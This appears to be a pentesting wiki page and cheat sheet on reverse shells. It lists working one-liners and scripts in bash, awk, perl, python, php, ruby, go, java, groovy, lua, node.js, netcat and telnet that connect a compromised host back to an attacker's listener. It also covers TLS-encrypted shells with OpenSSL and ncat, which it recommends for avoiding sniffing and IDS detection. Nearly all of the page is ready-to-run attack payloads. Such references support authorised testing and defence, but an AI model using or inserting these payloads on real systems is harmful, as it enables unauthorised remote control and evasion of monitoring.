---
title: Reverse Shells
weight: 402
---
# Reverse Shells

## At a Glance

After the exploitation of a remote code execution (RCE) vulnerability, the next step will be to interact with the compromised target.
Reverse shells, as opposed to bind shells, initiate the connection from the remote host to the local host. They are especially handy and, sometimes the only way, to get remote access across a NAT or firewall.

The chosen shell will depend on the binaries installed on the target system, although uploading a binary can be possible.[^pentestmonkey][^swisskyrepo-shells]

## Unencrypted Shells

### Netcat Listener

To get the connection from the remote machine (_`{{< param "war.rhost" >}}`_) and interact with it, a listener have to be set on the desired port (_`{{< param "war.lport" >}}`_) on the local machine (_`{{< param "war.lhost" >}}`_).

```sh
sudo nc -nvlp {{< param "war.lport" >}}
```
{{<details "Parameters">}}
- `n`: don't do DNS lookups.
- `v`: prints status messages.
- `l`: listen.
- `p <port>`: local port used for listening.
{{</details>}}

{{<note>}}
Use a port that is likely allowed via outbound firewall rules on the target network.

Ports from 1 to 1023 are by default privileged ports. To bind to a privileged port, a process must be running with root permissions.
{{</note>}}

### Bash

```sh
bash -i >& /dev/tcp/{{< param "war.lhost" >}}/{{< param "war.lport" >}} 0>&1
```

```sh
0<&196;exec 196<>/dev/tcp/{{< param "war.lhost" >}}/{{< param "war.lport" >}}; sh <&196 >&196 2>&196
```

### Awk

```sh
awk 'BEGIN {s = "/inet/tcp/0/{{< param "war.lhost" >}}/{{< param "war.lport" >}}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### Gawk

```gawk
#!/usr/bin/gawk -f

BEGIN {
    Service = "/inet/tcp/0/{{< param "war.lhost" >}}/{{< param "war.lport" >}}"
    while (1) {
        do {
            printf "0xffsec>" |& Service
            Service |& getline cmd
            if (cmd) {
                while ((cmd |& getline) > 0)
                    print $0 |& Service
            close(cmd)
            }
        } while (cmd != "exit")
        close(Service)
    }
}
```

### PERL

```sh
perl -e 'use Socket;$i="{{< param "war.lhost" >}}";$p={{< param "war.lport" >}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### PERL Windows

```sh
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"{{< param "war.lhost" >}}:{{< param "war.lport" >}}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### Python

```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{< param "war.lhost" >}}",{{< param "war.lport" >}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Python Windows

```sh
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('{{< param "war.lhost" >}}', {{< param "war.lport" >}})), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```

### PHP

```sh
php -r '$sock=fsockopen("{{< param "war.lhost" >}}",{{< param "war.lport" >}});exec("/bin/sh -i <&3 >&3 2>&3");'
```

```sh
php -r '$sock=fsockopen("{{< param "war.lhost" >}}",{{< param "war.lport" >}});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

### Ruby

```sh
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{{< param "war.lhost" >}}","{{< param "war.lport" >}}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

```sh
ruby -rsocket -e'f=TCPSocket.open("{{< param "war.lhost" >}}",{{< param "war.lport" >}}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Ruby Windows

```sh
ruby -rsocket -e 'c=TCPSocket.new("{{< param "war.lhost" >}}","{{< param "war.lport" >}}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### Golang

```sh
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{{< param "war.lhost" >}}:{{< param "war.lport" >}}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

### Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{{< param "war.lhost" >}}/{{< param "war.lport" >}};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### Groovy [^groovy-shell]

```groovy
String host="{{< param "war.lhost" >}}";
int port={{< param "war.lport" >}};
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

{{<note>}}
Java reverse shell also works for Groovy.
{{</note>}}

### Lua

```sh
lua -e "require('socket');require('os');t=socket.tcp();t:connect('{{< param "war.lhost" >}}','{{< param "war.lport" >}}');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

### Lua Windows

```sh
lua5.1 -e 'local host, port = "{{< param "war.lhost" >}}", {{< param "war.lport" >}} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

### NodeJS

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect({{< param "war.lport" >}}, "{{< param "war.lhost" >}}", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

```js
require('child_process').exec('nc -e /bin/sh {{< param "war.lhost" >}} {{< param "war.lport" >}}')
```

```js
-var x = global.process.mainModule.require
-x('child_process').exec('nc {{< param "war.lhost" >}} {{< param "war.lport" >}} -e /bin/bash')
```

### Netcat

```sh
nc -e /bin/sh {{< param "war.lhost" >}} {{< param "war.lport" >}}
```

Depending on the Netcat version, the `-e` option may not be available, but you still can execute a command after connection being established by redirecting file descriptors.
A FIFO or named pipe can be created locally so when a connection is established, `/bin/sh` gets executed and the shell prompt is given to the remote machine.[^nc-openbsd]

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{< param "war.lhost" >}} {{< param "war.lport" >}} >/tmp/f
```

### Netcat Windows

```sh
nc.exe {{< param "war.lhost" >}} {{< param "war.lport" >}} -e cmd.exe
```

### Telnet

```sh
rm -f /tmp/f; mknod /tmp/f p && telnet {{< param "war.lhost" >}} {{< param "war.lport" >}} 0/tmp/p
```

{{<note>}}
A FIFO can be create both with `mknod <path> p` or `mkfifo <path>` .
{{</note>}}


## Encrypted Shells

During an engagement is imperative to encrypt the communication between the target and the attacker to protect sensitive data and from further activity analysis.

Although most of the tools listed below do not support certificate pinning, meaning they won't protect you against a MITM attack, they can significantly reduce the risk of sniffing and IDS detection. [^cert-pinning]

### OpenSSL [^openssl]

Before starting the listener, a key pair and a certificate must be generated.

```sh
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```
{{<details "Parameters">}}
- `req`: certificate request and certificate generating utility.
- `-x509`: output a [x590 structure](https://en.wikipedia.org/wiki/X.509) instead of a certificate request.
- `-newkey <type:bits>`: specify as type:bits.
- `-keyout <file>`: send key to `<file>`.
- `-out`: output file.
- `-days <int>`: number of days cert is valid for.
- `-nodes`: don't encrypt the output key.
{{</details>}}

#### Listener

```sh
openssl s_server -key key.pem -cert cert.pem -port {{< param "war.lport" >}}
```
{{<details "Parameters">}}
- `s_server`: generic SSL/TLS server which listens for connections on a given port using SSL/TLS.
- `-key <key>`: private Key if not in `-cert`; default is `server.pem`.
- `-cert <cert>`: certificate file to use; default is `server.pem`.
- `-port <port>`: TCP/IP port to listen on for connections (default: 4433).
{{</details>}}

#### Reverse Shell

```sh
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -connect {{< param "war.lhost" >}}:{{< param "war.lport" >}} > /tmp/s 2> /dev/null; rm /tmp/s
```

{{<details "Parameters">}}
- `s_client`: generic SSL/TLS client which connects to a remote host using SSL/TLS.
- `-connect`: TCP/IP where to connect (default: 4433).
{{</details>}}

### Ncat [^ncat]

#### Listener

```sh
ncat -nvlp {{< param "war.lport" >}} --ssl
```

#### Reverse Shell

```sh
ncat -nv {{< param "war.lhost" >}} {{< param "war.lport" >}} -e /bin/bash --ssl
```

{{<details "Parameters">}}
- `-n`: do not resolve hostnames via DNS.
- `-v`: verbose mode.
- `-l`: bind and listen for incoming connections.
- `-p <port>`: specify source port to use.
- `-e <command>`: executes the given command.
{{</details>}}

[^pentestmonkey]: “Reverse Shell Cheat Sheet | Pentestmonkey.” Pentestmonkey | Taking the Monkey Work out of Pentesting, http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet.
[^nc-openbsd]: “Nc.Openbsd.” Man Pages Archive - Manned.Org, https://manned.org/nc.openbsd/6f0a5cf9.
[^swisskyrepo-shells]: swisskyrepo. “PayloadsAllTheThings/Reverse Shell Cheatsheet.Md at Master · Swisskyrepo/PayloadsAllTheThings · GitHub.” GitHub, https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md.
[^groovy-shell]: Frohoff, Chris. “Pure Groovy/Java Reverse Shell .” Gist · GitHub, 262588213843476, https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76.
[^cert-pinning]: “Certificate and Public Key Pinning Control.” OWASP Foundation | Open Source Foundation for Application Security, https://owasp.org/www-community/controls/Certificate_and_Public_Key_Pinning.
[^openssl]: OpenSSL Foundation, Inc. “/Docs/Manmaster/Man1/Openssl.Html.” OpenSSL.Org, https://www.openssl.org/docs/manmaster/man1/openssl.html.
[^ncat]: “Ncat Users’ Guide.” Nmap: The Network Mapper - Free Security Scanner, https://nmap.org/ncat/guide/index.html.
[^terminal-shell-console]: “What Is the Exact Difference between a ‘Terminal’, a ‘Shell’, a ‘tty’ and a ‘Console’? .” Unix & Linux Stack Exchange, https://unix.stackexchange.com/a/4132/356054.
